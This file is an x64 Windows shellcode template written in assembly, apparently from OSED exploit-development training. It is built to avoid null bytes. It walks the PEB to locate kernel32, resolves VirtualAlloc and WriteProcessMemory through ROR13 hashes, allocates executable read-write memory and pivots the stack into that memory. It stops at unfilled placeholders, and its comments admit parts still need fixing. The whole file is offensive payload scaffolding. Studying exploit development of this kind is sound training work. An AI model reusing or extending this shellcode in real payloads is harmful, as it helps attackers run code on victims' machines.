start:                      
  ; int3                          ; Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
  mov rbp, rsp                    ; move the esp to ebp, to create space we're going to substract from the esp, to create space
  add rsp, 0xfffffffffffff9c0             ; (*we will need 1600 space for a nop sled now) sub 1600 (python3 ./hex-convert.py -i -1600)

find_kernel32:               
  xor ecx, ecx                    ; ECX = 0
  mov rsi, gs:[ecx + 0x60]        ; ESI = &(PEB) ([FS:0x30])
  mov rsi, [rsi + 0x18]           ; ESI = PEB->Ldr
  mov rsi, [rsi + 0x20]           ; ESI = PEB->Ldr.InInitializationOrderModuleList

next_module:; int3 ; walk through the list with `dt nt!_LDR_DATA_TABLE_ENTRY poi(poi(poi(poi(poi(rsi + 0x08)+0x8)+0x8)+0x8)+0x8)`
  mov rbx, [rsi + 0x20]           ; EBX = InInitializationOrderModuleList[X].base_address
  mov rdi, [rsi + 0x50]           ; EDI = InInitializationOrderModuleList[X].module_name ; changed to BaseDllName
  mov rsi, [rsi]                  ; ESI = InInitializationOrderModuleList[X].flink (next)

  cmp [rdi + 12 * 2], cx          ; (unicode) modulename[12] == 0x00 ?    
  jne next_module                 ; No: try next module.

; int3
not_used_label:                   ;
  jmp find_function_ret_addr      ; Jump short, this will not generate null bytes

find_function_ret:                ; jump label to be able to jump over this part, and code without null bytes
  pop rsi                         ; get esi as pointer
  mov [rbp + 0x04], rsi           ; Save the return pointer from the call instruction
  jmp resolve_symbols_kernel32    ; Jump short, RIP = RIP + 8-bit displacement sign extended to 64-bits.

find_function_ret_addr:
  call find_function_ret


find_function:
                                  ; For this part I've used the following binary:
                                  ; https://github.com/adamhlt/PE-Explorer
  ; pushad                          ; Save all registers

  ; push rbx                        ; (pushad)  Save the registers that will be modified
  ; push rdi                        ; (pushad)  Save the registers that will be modified
  ; push rsi                        ; (pushad)  Save the registers that will be modified
  ; push rdx                        ; (pushad)  Save the registers that will be modified
  ; push rcx                        ; (pushad)  Save the registers that will be modified
  ; push rax                        ; (pushad)  Save the registers that will be modified

  ; int3                          ; !dh -a rbx * gives back the current dll status shit
  xor rax, rax
  ; int3                          ; db poi(rbx + 0x3c) & 0xffffffff ; DOS HEADER -> e_lfanew (0x3c)
                                  ; db (poi(rbx + 0x3c) & 0xffffffff) + rbx; PE header
                                  ; db ((poi(rbx + 0x3c) & 0xffffffff) + rbx) + 0x88; RVA DataDirectory (Export Table) VirtualAddress
                                  ; db (poi(((poi(rbx + 0x3c) & 0xffffffff) + rbx) + 0x88) & 0xffffffff) + rbx; dereferenced Datadirectory
                                  ; ? poi((poi(((poi(rbx + 0x3c) & 0xffffffff) + rbx) + 0x88) & 0xffffffff) + rbx + 0x18) & 0xffffffff; NumberOfNames
                                  ; ? poi((poi(((poi(rbx + 0x3c) & 0xffffffff) + rbx) + 0x88) & 0xffffffff) + rbx + 0x20) & 0xffffffff; AddressOfNames RVA 
                                  ; ? rbx + (poi((poi(((poi(rbx + 0x3c) & 0xffffffff) + rbx) + 0x88) & 0xffffffff) + rbx + 0x20) & 0xffffffff); AddressOfNames RVA 
  mov eax, [rbx + 0x3c]           ; Offset to PE Signature (e_lfanew)
  ; int3
  ; add al, 0x88
  xor ecx, ecx
  add cl , 0x88
  ; mov edi, [rbx + rax + 0x88]     ; Export Table Directory RVA, DataDirectory
  add rcx, rax
  mov edi, [rbx + rcx]
  ; mov edi, [rbx + rax]            ; Export Table Directory RVA, DataDirectory (Export Table) VirtualAddress
  add rdi, rbx                    ; Export Table Directory VMA
  xor edx, edx
  xor ecx, ecx
  xor edx, edx
  mov ecx, [rdi + 0x18]           ; NumberOfNames
  mov eax, [rdi + 0x20]           ; AddressOfNames RVA
  ; mov edx, [rdi + 0x24]           ; AddressOfNames Ordinal Table
  add rax, rbx                    ; AddressOfNames VMA
  ; add rdx, rbx                    ; 
  mov [rbp - 8], rax              ; Save AddressOfNames VMA for later
  ; mov [rbp - 8], rdx              ; 
  ; int3

find_function_loop:
  jecxz find_function_finished    ; Jump to the end if ECX is 0
  dec rcx                         ; Decrement our names counter
  mov rax, [rbp - 8]              ; Restore AddressOfNames VMA
  mov esi, [rax + rcx * 4]        ; Get the RVA of the symbol name
  ; int3                          ; da rbx + (poi(rax + rcx * 4) & 0xffffffff), gives back uaw_wcslen
  add rsi, rbx                    ; Set ESI to the VMA of the current symbol name

compute_hash:        
  ; int3
  xor eax, eax                    ; NULL EAX
  cdq                             ; NULL EDX
  cld                             ; Clear direction

compute_hash_again:          
  ; lodsb                           
  mov al,[rsi]                    ; Load the next byte from esi into al
  inc rsi                         ; Increase the rsi buffer
  test al, al                     ; Check for NULL terminator
  jz compute_hash_finished        ; If the ZF is set, we've hit the NULL term
  ror edx, 0x0d                   ; Rotate edx 13 bits to the right
  add edx, eax                    ; Add the new byte to the accumulator
  jmp compute_hash_again          ; Next iteration

compute_hash_finished:
; int3

find_function_compare:
  cmp edx, [rsp + 8]              ; Compare the computed hash with the requested hash
  jnz find_function_loop          ; If it doesn't match go back to find_function_loop
  ; int3 ; below needs fixing... ;)
  mov edx, [rdi + 0x24]           ; AddressOfNameOrdinals RVA
  add rdx, rbx                    ; AddressOfNameOrdinals VMA
  mov cx,  [rdx + 2 * rcx]        ; Extrapolate the function's ordinal
  mov edx, [rdi + 0x1c]           ; AddressOfFunctions RVA
  add rdx, rbx                    ; AddressOfFunctions VMA
  mov eax, [rdx + 4 * rcx]        ; Get the function RVA
  add rax, rbx                    ; Get the function VMA
  ; mov [rsp + 0x1c], rax           ; Overwrite stack version of eax from pushad

find_function_finished:
  ; Restore the registers in reverse order
  ; pop rax
  ; pop rcx
  ; pop rdx
  ; pop rsi
  ; pop rdi
  ; pop rbx
  ; popad                           ; Restore registers
  ret                             ;  

resolve_symbols_kernel32:
  ; nop
                                  ; PS C:\Users\deadbeef\github\OSED\scripts\share-offsec\scripts\custom-shellcode> python .\determen_hash.py VirtualAlloc 0x91afca54
  mov eax, 0x91afca54             ; VirtualAlloc hash
  push rax                        ; Push rax to rsp
  call qword ptr [rbp + 0x04]     ; Call find_function
  mov [rbp + 0x14], rax           ; Save the address for later usage
  mov eax, 0xd83d6aa1             ; WriteProcessMemory hash
  push rax                        ; Push rax to rsp
  call qword ptr [rbp + 0x04]     ; Call find_function
  mov [rbp + 0x1c], rax           ; Save the address for later usage
  
                                  ; python C:\Users\deadbeef\github\OSED\scripts\share-offsec\scripts\custom-shellcode\.\determen_hash.py WriteProcessMemory
;   push 0xd83d6aa1
;   call qword ptr [ebp + 0x04]     ; Call find_function
;   mov [ebp + 0x18], eax           ; Save the address for later usage

  ; int3
  ; func1(int a, int b, int c, int d, int e, int f);
  ; // a in RCX, b in RDX, c in R8, d in R9, f then e pushed on stack
  
  xor rax, rax
  add al, 0x40
  ; int3
  mov R9, rax                       ; PAGE_EXECUTE_READWRITE
  xor r8, r8
  inc r8
  shl r8, 0xc
  ; int3 
  ; mov r8, 0x1000                     ; MEM_COMMIT
  mov rdx, R8
  shl rdx, 0x3
  ; mov rdx, 0x8000                     ; length of the chain...
  xor rcx, rcx
  ; mov rcx, 0x0                        ; NULL - Let system decide where to allocate
  call qword ptr [rbp + 0x14]     ; call the VirtualAlloc function
  ; int3

  xor rcx, rcx
  add cl, 0x15
  shl rcx, 8
  add rax, rcx

  ; Do it all again for the second VirtualAlloc:
  xor rax, rax
  add al, 0x40
  ; int3
  mov R9, rax                       ; PAGE_EXECUTE_READWRITE
  xor r8, r8
  inc r8
  shl r8, 0xc
  ; int3 
  ; mov r8, 0x1000                     ; MEM_COMMIT
  mov rdx, R8
  shl rdx, 0x3
  ; mov rdx, 0x8000                     ; length of the chain...
  xor rcx, rcx
  ; mov rcx, 0x0                        ; NULL - Let system decide where to allocate
  call qword ptr [rbp + 0x14]     ; call the VirtualAlloc function
  ; int3

  xor rcx, rcx
  add cl, 0x15
  shl rcx, 8
  add rax, rcx                    ; add 0x1500 so to be sure stubs can reserve some memory when calling it.

  mov rcx, rbp                    ; Save the ebp (old) to ecx, for later use
  call get_eip                    ; Calls the label 'get_eip', pushing the address of the next instruction onto the stack
  jmp continue                    ; Jumps to the 'continue' label to resume execution

get_eip:
  nop
  ; pop ebx                         ; Pops the return address (value of EIP at the 'call') into the EBX register
  add rbx, 8                      ; add 8 for instr length
  jmp continue         ; Jumps back to the instruction after the 'call'

start_after_get_eip:
continue:
  mov rsp, rax                    ; Set the eax (retval of VirtualAlloc) as the new esp.
  add rsp, 0x64
  sub rbx, start_after_get_eip    ; substract the function start_after_get_eip
  mov rdi, rbx                    ; move ebx (the current eip pointer to the stack) 
  mov rbp, rsp                    ; set the ebp equals to esp, esp is not referenceable, ebp is.
  
  EBP_OFFSET_CALL_FUNCTION
  int3
  ret


FUNCTIONS_TO_REPLACE

